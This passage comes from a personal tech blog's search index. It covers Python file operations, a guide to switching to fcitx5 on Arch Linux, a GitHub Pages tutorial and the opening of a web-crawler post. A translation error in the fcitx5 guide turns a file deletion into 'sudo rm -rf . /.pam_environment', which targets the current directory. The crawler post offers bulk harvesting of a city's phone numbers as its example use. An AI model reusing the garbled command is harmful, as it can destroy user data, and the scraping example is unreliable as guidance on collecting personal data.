by people and forgotten. Even worse, it could be easily destroyed by a script kiddie who delivers food, just like the joke I told earlier. The above is just my personal opinion. If there are any errors, please feel free to correct me in the comments below. ","date":"2020-09-26","objectID":"/posts/2020-09-26/:4:0","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Programming"],"content":"Python study notes on the basics of reading and writing files","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"File Operations ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:0","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"open open() is the key function in Python for file operations, with two parameters that need to be set: Filename - the name of the file, self-explanatory Mode - determines if the file being opened can be read/written to or has other attributes. open('filename','mode') ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:1","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Reading Open a file in read-only mode: f = open(\"filename.txt\") This is equivalent to: f = open(\"filename\",\"rt\") “r” indicates to read “t” indicates that the file is text, this is the default setting for the function, so it can be omitted. Here’s a list from w3schools: There are four different methods (modes) for opening a file: “r” - Read - Default value. Opens a file for reading, error if the file does not exist “a” - Append - Opens a file for appending, creates the file if it does not exist “w” - Write - Opens a file for writing, creates the file if it does not exist “x” - Create - Creates the specified file, returns an error if the file exists In addition you can specify if the file should be handled as binary or text mode “t” - Text - Default value. Text mode “b” - Binary - Binary mode (e.g. images) For example, let’s say we have a file: /home/weepingdogel/test.txt --- Hello!I love Python. We can read the file without specifying the mode parameter: f = open('test.txt') print(f.read()) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Or we can specify it: f = open('test.txt', 'rt') print(f.read()) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:2","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Reading lines File: /home/weepingdogel/test.txt --- Hello!I love Python. Have a nice day! Good luck! When we encounter a multiline file, we can choose to read only one line at a time using f.readline() For example: f = open('test.txt') print(f.readline()) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. If we need two lines: f = open('test.txt') print(f.readline()) print(f.readline()) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Have a nice day! If we need three lines: f = open('test.txt') print(f.readline()) print(f.readline()) print(f.readline()) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Have a nice day! Good luck! This usage reads line by line and prints with line breaks. You may need it when reading configuration files… Of course, we can also use a for() loop to read all lines at once: f = open('test.txt') for x in f: print(x) Output: weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Have a nice day! Good luck! I think using for is more efficient… ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:3","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Closing files Nothing much to say here… f = open('test.txt') print(f.read()) f.close() The effect is similar to the previous example. I won’t provide debugging results below, it’s too late. ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:4","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Creating “x” indicates creating a new file. If the specified filename already exists, an error will be returned. f = open(\"test.txt\",\"x\") Try it out yourself, nothing much else. ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:5","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Writing to a file The character 'a' represents adding content to an existing file without deleting or overwriting its original contents. For example: f = open(\"test.txt\",\"a\") f.write(\"加入内容 / content added.\") The above string will be added to the file. The character 'w' represents overwriting the file, which will replace any existing content. For example: f = open(\"test.txt\", \"w\") f.write(\"加入内容 / content added.\") In this case, only the string specified will exist in the file. ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:6","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Deleting a file You need to use the os module and its os.remove() function. Simply type import os to import it. import os os.remove(\"test.txt\") Classic example Check if a file exists, delete it if it does, or display a message if it doesn’t. Deleting a directory Use os.rmdir(). import os os.rmdir(\"foldername\") ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:7","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"Conclusion These are the basics of file read/write operations that you should know. If you’re having trouble understanding, you can try running the following code with different open() mode parameters. Summary code: import os import datetime def sign(): # Program identification print( ''' ╭╮╭╮╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╭╮ ┃┃┃┃┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╮╭╮┃╱╱╱╱╱╱╱╱┃┃ ┃┃┃┃┃┣━━┳━━┳━━┳┳━╮╭━━╮┃┃┃┣━━┳━━┳━━┫┃ ┃╰╯╰╯┃┃━┫┃━┫╭╮┣┫╭╮┫╭╮┃┃┃┃┃╭╮┃╭╮┃┃━┫┃ ╰╮╭╮╭┫┃━┫┃━┫╰╯┃┃┃┃┃╰╯┣╯╰╯┃╰╯┃╰╯┃┃━┫╰╮ ╱╰╯╰╯╰━━┻━━┫╭━┻┻╯╰┻━╮┣━━━┻━━┻━╮┣━━┻━╯ ╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╭━╯┃ ╱╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╰━━╯╱╱╱╱╱╱╰━━╯ ''' ) def filecrt(filename): # File creation if os.path.exists(filename): # Check if the file exists print(str(datetime.datetime.now()) + \": The file already exists\") return 0 else: f = open(filename,'x') f.close() print(str(datetime.datetime.now()) + \": Created file: \" + filename) return 1 def filewrt(filename): fruits = ['apple', 'banana', 'strawberry','orange'] # Specify the contents to be written # File write operation f = open(filename, 'w') for fruit in fruits: f.write(fruit + '\\n') print(str(datetime.datetime.now()) + \": Writing: \" + fruit) f.close() def filedel(filename): # Delete file operation if os.path.exists(filename): os.remove(filename) print(str(datetime.datetime.now()) + \": Deleted file: \" + filename) else: print(str(datetime.datetime.now()) + \": \" + filename + \" does not exist\") def fileread(filename): print(str(datetime.datetime.now()) + \": Reading...\" ) f = open(filename,'r') print(\"-\" * 5 + \" File contents \" + \"-\" * 5 + \"\\n\") print(f.read()) print(\"-\" * 5 + \" File contents \" + \"-\" * 5 + \"\\n\") sign() if filecrt(\"test.txt\") == 0: fileread(\"test.txt\") filedel(\"test.txt\") else: filewrt(\"test.txt\") fileread(\"test.txt\") filedel(\"test.txt\") ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:2:0","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Problem solving"],"content":"If the input method is disabled after update, look here!!!","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"What happened I recently received a message like this For those who use $HOME/.pam_environment to set environment variables, take note! Due to CVE-2010-4708, pam upstream is set to not read user’s environment variable settings by default in version 1.4.0, and users are required to change their environment variable settings or restore the original default read behavior. ref: Linux environment variables how to set Evian’s Blog Why is the 10-year vulnerability only now fixed? Emmmm, so that’s what the vulnerability is. Emmmm, so that is .pam_environment this file can not be used …… Here thanks to lilydjwg for writing out the way to deal with various situations I’ll write a note about replacing fcitx5 in xfce + lightdm environment… Other specifics can be found in what lilydjwg wrote… (Escape ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:1:0","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"fcitx5 vs fcitx Fcitx Fcitx (Flexible Input Method Framework) ── i.e. Little Penguin Input Method, which is an input method distributed under GPL wiki/Input_method) platform, which can support multiple input methods by installing the engine, and supports simple input and output, it is a common Chinese input method in Linux OS. It has the advantage of being short and compact, and has good compatibility with programs. — Arch Wiki Fcitx5 Fcitx5 is the next generation input method framework after Fcitx. — Arch Wiki Daily lazy, direct quotes (flee ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:2:0","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"Okay, let’s get right to it first post my system situation Operating system: Arch Linux Desktop environment: xfce Display Manager: lightdm Actually, just writing the input method environment variables from .pam_environment to .xprofile will solve the problem, but I’d like to try fcitx5. ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:0","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"Uninstall the old version fcitx First of all, we need to uninstall the original fcitx, I was using fcitx-googlepinyin input method before, so I need to uninstall this package too, because there will be dependency. Besides, all the packages that have some relationship with fcitx should be uninstalled, otherwise pacman will report error, so you have to execute this (PS: you may not use Google input method, so please change fcitx-googlepinyin to the package name of the input method you installed) sudo pacman -Rs fcitx-configtool fcitx-googlepinyin fcitx-qt5 fcitx Next, delete this file, it’s useless anyway (escape $ sudo rm -rf . /.pam_environment ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:1","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"Installing fcitx5 Now to install fcitx5, this is how to do it fcitx5 The main package, no need to explain fcitx5-chinese-addons Chinese input method package …. Arch Wiki explains it like this. fcitx5-chinese-addons contains a lot of Chinese input methods: Pinyin, ShuangPin, WubiPinyin, Natural Code, CangJie, BingToad Holographic, ErBi, etc. fcitx5-im Environment dependency package, you have to install it, otherwise you can’t type on some software fcitx5-configtool fcitx5’s GUI configuration tool, because I don’t know how to modify the configuration file, so I installed this. Install it after the three above. Then, execute $ sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-im fcitx5-configtool After the package is installed, it will theoretically boot up, but well, there can be some metaphysical problems, so do this manually first $ sudo cp /usr/share/applications/fcitx5.desktop ~/.config/autostart/ -v ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:2","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"Environment variables Well, finally it’s set environment variable, since .pam_environment can’t be used, where to write it? lilydjwg said: Using X11 desktop environment, usually login through display manager, such as lightdm and sddm. Both of them support ~/.xprofile. This file will be sourced during boot, using a shell determined by dm itself. Both lightdm and sddm use /bin/sh (in the files /etc/lightdm/Xsession and /usr/share/sddm/scripts/Xsession respectively). As you can see, in addition to reading .xprofile, lightdm also reads .profile. sddm even reads the startup configuration scripts for bash, zsh, tcsh, and fish. That is, we need to write the fcitx5 environment variables in the .xprofile file Then… $ vim . /.xprofile Write these things in it export INPUT_METHOD=fcitx5 export GTK_IM_MODULE=fcitx5 export QT_IM_MODULE=fcitx5 export XMODIFIERS=@im=fcitx5 Next you can choose to restart lightdm, $ sudo systemctl restart lightdm Or reboot the system. $ sudo reboot At this time, a keyboard appears in the status bar of xfce, but pressing CTRL + SPACE but it does not bring up the Chinese input method, so what should we do? Right-click the keyboard icon, click Configure, and then go to the QT configuration tool to add Chinese input methods on it! Just double click to add to the left ~ Then click OK and start enjoying fcitx5! ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:3","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Problem solving"],"content":"Reference links How to set environment variables for Linux - Evian’s Blog Fcitx5 (Simplified Chinese) - ArchWiki Fcitx - Wikipedia Fcitx (Simplified Chinese) - ArchWiki Translated with www.DeepL.com/Translator (free version) ","date":"2020-07-25","objectID":"/posts/%E5%85%B3%E4%BA%8Efcitx5/:4:0","tags":["Arch Linux","input method","fcitx","fcitx5","CVE-2010-4708"],"title":"About fcitx5, and recent environment variable issues","uri":"/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["Web"],"content":"Creating fully static web pages using GitHub Pages.","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"Informal Introduction I’m back again~ Hehe, I definitely won’t tell you that I’m here to have some fun again~ Ah, don’t hit me~ It hurts! ","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:1:0","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"What is GitHub? Newbie: Hey, what is GitHub, senpai? Senpai: I don’t know, go away. Newbie: sobs Senpai, you won’t help me anymore, sobs Ahem… Github is a source code hosting platform based on Git. It was founded by Chris Wanstrath, PJ Hyett, and Tom Preston-Werner in April 2008. Currently, it has 59 full-time employees and primarily offers version control services based on Git. It is often jokingly referred to as Gayhub by some people. HaHa! Today, GitHub is: A community with 1.43 million developers. It includes top-level hackers like Linux creator Torvalds and young geeks like Rails founder DHH. The most popular open-source hosting service on this planet. It currently hosts 4.31 million Git projects. Not only are more and more well-known open-source projects migrating to GitHub, such as Ruby on Rails, jQuery, Ruby, Erlang/OTP, but also popular open-source libraries of the past three years tend to debut on GitHub, for example, Bootstrap, Node.js, CoffeeScript, and more. Ranked 414 globally according to Alexa. In other words, if you want to release your well-written open-source program, GitHub would be the best choice. ","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:2:0","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"Main Content of this Issue This issue will cover how to use GitHub to build a simple website. ","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:3:0","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"Benefits of Using GitHub for Website Development Security Since your website source code is hosted on GitHub, the security of your website is directly tied to the security of GitHub itself. If someone wants to attack your website, they would need to compromise GitHub first. Simplicity Most operations can be easily accomplished with basic front-end knowledge. Peace of Mind With GitHub’s server handling the back-end, you don’t need to maintain it 24/7. It can be set up to run without constant supervision. ","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:3:1","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"Drawbacks of Using GitHub for Website Development Limitations GitHub repositories can only run static web pages based on technologies like HTML. It doesn’t support dynamic features like databases and other advanced functionalities. Prohibition of Web Crawlers GitHub repositories are not indexed by search engines, which means that websites hosted on GitHub won’t be discoverable through search engine results.(In reality, it has been proven that GitHub-hosted websites can be indexed by search engines.) The above points outline the advantages and disadvantages of using GitHub for website development. Before starting the building process, it is crucial to carefully consider your specific circumstances and requirements. ","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:3:2","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"Detailed Tutorial ","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:4:0","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"Preparation Account Registration Firstly, you need to register an account on GitHub. It only requires an email address for registration. The specific steps are straightforward and most people are familiar with the process. Creating a Repository Once you have logged into your account, you will see a green new button in the top-left corner. Click on it. Then, a form will pop up asking you to fill in some information. As shown in the image, the Repository name refers to the name of your repository. Note: GitHub only allows using a repository name that is the same as your username for hosting webpages. Here is a special format: yourGitHubUsername.github.io This repository name will become your website address. Once created, the repository will be empty. At this point, you can follow the prompts to upload your website code as instructed. ","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:4:1","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"Uploading Code Here, I will provide a portion of the usage of git. First, create a directory: $ mkdir ./YourGitHubUsername The name of this directory can be arbitrary, but for better management, it is recommended to use your GitHub username. Next, navigate into this directory: $ cd ./YourGitHubUsername Execute: $ git init This command initializes the directory as a Git repository. If you don’t understand it, you can learn more about Git here. Next, you can start creating and writing your website code. For example, let’s create a simple HTML file. First, create an index.html file: $ vim ./index.html Here, we use vim, which will automatically open an editing page in your terminal. Next, press the i key to enter the editing mode. Inside the file, enter the following code: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eHelloWorld\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eHelloWorld\u003c/h1\u003e \u003cp\u003eHelloWorld, this is my first website.\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e You can use HTML language to freely write your website. You can add multiple HTML page files, CSS stylesheets, and even JavaScript to enhance your website. After finishing writing your code, press the ESC key to exit the editing mode and return to command mode. Next, press the : key, and you will see a colon appearing at the bottom left corner of your vim. :wq Next… execute $ git add index.html This will stage your created web page code file for commit. If you have multiple files, you can try $ git add * This way, you can quickly stage all your files for commit. Then, execute the following commands one by one to commit your changes: $ git commit -m \"first commit\" $ git remote add origin https://github.com/YourGitHubUsername/YourGitHubUsername.github.io.git $ git push -u origin master Next, enter your GitHub username and password to complete the submission. After that, you can access your website in a web browser. The address is as mentioned above: YourGitHubUsername.github.io Screenshot: ","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:4:2","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"Conclusion The above is the complete process of building a simple website using GitHub. Due to time constraints, this is all that can be covered for now. The next issue may be delayed for a while. ","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:5:0","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"References Git Tutorial Archwiki | Vim Archwiki | Git HTML Tutorial ","date":"2019-10-13","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:6:0","tags":["Notes","HTML","GitHub Pages","Website","Web Development"],"title":"How to Build a Website Using GitHub","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Programming"],"content":"Although the website being crawled has been shut down...","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"A Casual Preface Hey, I’m back. Today, I set up hexo in my U-disk, so I can continue to update my blog. And this time I added a visitor counter to my blog. Feel free to help increase the count!～ So, in this post, I will introduce a simple web crawler implemented in Python. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:1:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Principles of Web Crawlers Beginner: Hey there, what is a web crawler? Expert: Go search it on a search engine. Beginner: I did, but I still don’t understand it. Expert: Uh…then keep reading… ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:2:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Overview To put it simply, a web crawler automates the process of browsing web pages to extract desired information and content from them. We all know that we use web browsers to access the Internet. So how do we visit a webpage? Here’s a brief overview (I’m too lazy to draw): Browser –Sends a request for www.bing.com–\u003e Server \u003c–Receives the request– Server –Responds with data–\u003e –Returns the data–\u003e Browser What? Still confused? Let’s take a look using a browser. Open any webpage. Using Chrome/Chromium as an example, right-click and select “Inspect”, then go to the “Network” tab, and check the “Preserve log” checkbox. Refresh the page and you’ll see the following content: As you can see, the browser displays the request content in great detail. And the left lists are the contents you retrieve from the website. A web crawler automates these processes so that we don’t need to visit websites manually to get the information we want. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:2:1","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"The Purpose of Web Crawlers For example, let’s say there is a website 全国号码段(链接已失效) where we need to obtain all the phone numbers of one of the phone number segments in a city, such as Xi’an. As you can see, there are many phone number segments, each with ten thousand phone numbers. What should we do? Can’t we copy and paste them one by one using the mouse, right? This is where web crawlers come into play. Actually, it can also be used to crawl my blog so that you can receive update information in a timely manner. Ah, please don’t hit me, it hurts! ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:2:2","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Choosing a Programming Language To perform web crawling, we need to use a programming language. The most commonly used one is Python because it is easy to use for web crawling. However, you can also choose other languages such as C/C++, Java, or even Visual Basic. The level of difficulty and coding methods may be different, but the purpose and functionality are the same. In this post, we will choose Python. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:3:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Installing 